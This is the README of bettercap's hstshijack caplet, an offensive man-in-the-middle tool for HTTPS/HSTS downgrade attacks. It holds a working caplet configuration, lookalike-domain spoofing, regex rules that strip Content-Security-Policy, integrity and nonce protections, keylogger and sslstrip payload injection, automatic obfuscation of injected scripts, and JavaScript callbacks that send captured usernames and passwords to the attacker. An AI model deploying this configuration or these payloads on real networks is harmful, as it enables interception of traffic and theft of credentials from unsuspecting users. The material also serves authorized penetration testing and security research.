<p align="center">
  <img width="420px" src="https://raw.githubusercontent.com/buffermet/cdn/master/github.com/bettercap/caplets/hstshijack/logo.svg" />
</p>

### Caplet ([hstshijack.cap](https://github.com/bettercap/caplets/blob/master/hstshijack/hstshijack.cap))

```sh
# Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack

# Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
# variables get precendence over those assigned to the 'hstshijack.ignore' variable.
set hstshijack.targets                    *.com, *.net,*.me, *.nl,*.ai,*.co.uk,*.cn,*.google
set hstshijack.replacements               *.corn,*.nel,*.rne,*.ni,*.al,*.cc.uk,*.ch,*.googl
set hstshijack.replacements.req.body      /usr/local/share/bettercap/caplets/hstshijack/replacements/req.Body.json
set hstshijack.replacements.req.headers   /usr/local/share/bettercap/caplets/hstshijack/replacements/req.Headers.json
set hstshijack.replacements.req.url       /usr/local/share/bettercap/caplets/hstshijack/replacements/req.URL.json
set hstshijack.replacements.res.body      /usr/local/share/bettercap/caplets/hstshijack/replacements/res.Body.json
set hstshijack.replacements.res.headers   /usr/local/share/bettercap/caplets/hstshijack/replacements/res.Headers.json
set hstshijack.ssl.domains                /usr/local/share/bettercap/caplets/hstshijack/ssl/domains.txt
set hstshijack.ssl.index                  /usr/local/share/bettercap/caplets/hstshijack/ssl/index.json
set hstshijack.ssl.index.check            true
set hstshijack.ssl.discovery.synchronous  true
set hstshijack.ssl.discovery.timeout      4
set hstshijack.cookies.downgrade          true
#set hstshijack.blockscripts               example.com,*.example.com
set hstshijack.obfuscate                  true
set hstshijack.payloads                   *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js
set hstshijack.whitelist                  /usr/local/share/bettercap/caplets/hstshijack/session/whitelist.json
set hstshijack.ignore                     captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com,www.msftconnecttest.com

net.recon on

set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/modules/http.proxy.js
http.proxy on

set dns.proxy.script /usr/local/share/bettercap/caplets/hstshijack/modules/dns.proxy.js
dns.proxy on
```

### <a href="./payloads/hijack.js">**hijack.js**</a> payload

This module injects files with a JavaScript payload (<a href="./payloads/hijack.js">**hijack.js**</a>) which acts as a callback for bettercap, and takes care of hostname spoofing in the DOM.

### Scalable domain indexing (SSL log)

<br>

<p align="center">
  <img src="https://raw.githubusercontent.com/buffermet/cdn/master/github.com/bettercap/caplets/hstshijack/ssl.index.png" alt="Indexed domains that use HTTPS" />
</p>

When hosts respond with an HTTPS redirect, bettercap will save their hostname in lists that are sorted by domain prefixes, allowing the list to scale by reducing a considerable amount of overhead for the proxy module.

By default, this caplet will remap these lists of domains that were found in the file that you assigned to the `hstshijack.ssl.domains` variable on launch (to ensure that it is still in the right format). You can skip this by setting the `hstshijack.ssl.index.check` variable to `false`.

Bettercap will also send a HEAD request to unknown hosts that were discovered in the injected document and retrieved via a callback from the <a href="./payloads/hijack.js">**hijack.js**</a> payload. This is done to learn what hosts use HTTPS, ahead of time.

Hostnames that you target with the `hstshijack.targets` variable are automatically logged and indexed.

### Hostname spoofing

In the <a href="./hstshijack.cap">**caplet file**</a> you can assign comma separated domains to the `hstshijack.targets` variable. _(wildcard allowed)_

For every targeted hostname you must specify a replacement hostname, like this:

```sh
set hstshijack.targets       google.com, *.google.com
set hstshijack.replacements  google.corn,*.google.corn
```

You can try to make them as unnoticeable as you can, but your options are limited here in terms of evading HSTS.

### Regular Expression replacements

In the <a href="https://github.com/bettercap/caplets/blob/master/hstshijack/replacements">**replacements directory**</a> you can find 5 JSON files that are used to spoof HTTP requests and responses. Each Regular Expression that you configure will be pre-compiled when the module is loaded.

Each Regular Expression set is formatted as follows: `[SELECTOR, FLAGS, REPLACEMENT]`

Example of response body replacements (<a href="https://raw.githubusercontent.com/bettercap/caplets/refs/heads/master/hstshijack/replacements/res.Body.json">res.Body.json</a>):

```json
{
	"html": {
		"*.amazon.com": [
			["(['\"`](?:http|ws)|sourceMappingURL=http)s", "ig", "$1"],
			["((?:['\"`](?:(?:http|ws)://|//)?|sourceMappingURL=http://)[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"],
			[" http-equiv=['\"]?content-security-policy(?:-report-only)?['\"]?([ />])", "ig", "$1"],
			[" integrity=['\"][^'\"]+['\"]([ />])", "ig", "$1"],
			[" nonce=[\"][^\"]+['\"]([ />])", "ig", "$1"]
		]
	},
	"javascript": {
		"*.amazon.com": [
			["((?:['\"`]|sourceMappingURL=)(?:http|ws))s", "ig", "$1"],
			["((?:['\"`](?:(?:http|ws)://|//)?|sourceMappingURL=http://)[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"]
		],
		"apis.google.com": [
			["(V=function\\(a\\)\\{)", "g", "$1if(1)return;"]
		]
	},
	"json": {
		"*": [
			["(\"(?:http|ws))s", "ig", "$1"],
			["(\"(?:(?:http|ws)://|//)?[a-z0-9-.]+)[.]com([^a-z0-9-.]|$)", "ig", "$1.corn$2"]
		]
	}
}
```

### Block scripts

In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript from hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 

### Custom payloads

You can also inject your own scripts into files from your specified hosts by assigning them to the `hstshijack.payloads` variable.

Custom payloads are (optionally) obfuscated at launch, executed synchronously, and wrapped inside a function that is defined as a property of the current JavaScript context (globalThis). This is done to ensure that your payload is only executed once per application, even if injected multiple times.

Example:

```sh
set hstshijack.payloads *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
```

### Obfuscation

You can write custom payloads that are automatically obfuscated by the module.

Basically, every word that was found beginning with `obf_hstshijack_` will be obfuscated.

Example: 

```js
function obf_hstshijack_function() {
  alert("Random variable: obf_hstshijack_whatever_follows")
}

obf_hstshijack_function()
```

Will be injected as:

```js
function jfIleNwmKoa() {
  alert("Random variable: AsjZnJWklwMNqshCaloE")
}

jfIleNwmKoa()
```

### Silent callbacks

You can have your payloads send callbacks to your machine that bettercap will print, but not proxy.

Example of a silent callback:

```js
form.onsubmit = function() {
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.host + "/obf_hstshijack_path_callback?username=" + username + "&password=" + password)
  req.send()
}
```

The following POST request will be sniffed by bettercap, but not proxied (the request will be dropped). 

Any instance of `obf_hstshijack_path_callback` will be replaced with the callback path (see example above).

### Whitelisting callbacks

You can automatically terminate an attack between specific clients and hosts by making the client's machine initiate a whitelisting callback.

Example of multiple whitelisting callbacks:

```js
// Whitelist multiple hosts to ensure the intended resources will load.

form.onsubmit = function() {
  // Whitelist current hostname and phish credentials
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.hostname + "/obf_hstshijack_path_whitelist?email=" + email + "&password=" + password)
  req.send()

  // Whitelist facebook
  req = new XMLHttpRequest()
  req.open("POST", "http://facedook.com/obf_hstshijack_path_whitelist")
  req.send()

  // Whitelist facebook CDN
  req = new XMLHttpRequest()
  req.open("POST", "http://static.xx.fdcdn.net/obf_hstshijack_path_whitelist")
  req.send()

  // Whitelist redirect to facebook
  req = new XMLHttpRequest()
  req.open("POST", "http://fd.com/obf_hstshijack_path_whitelist")
  req.send()
}
```

When a request is sent as above, bettercap will stop spoofing connections between the sender and the requested host.

If any resource from a spoofed host is requested that was previously whitelisted for that client, then that client will be redirected to the intended (unspoofed) host.
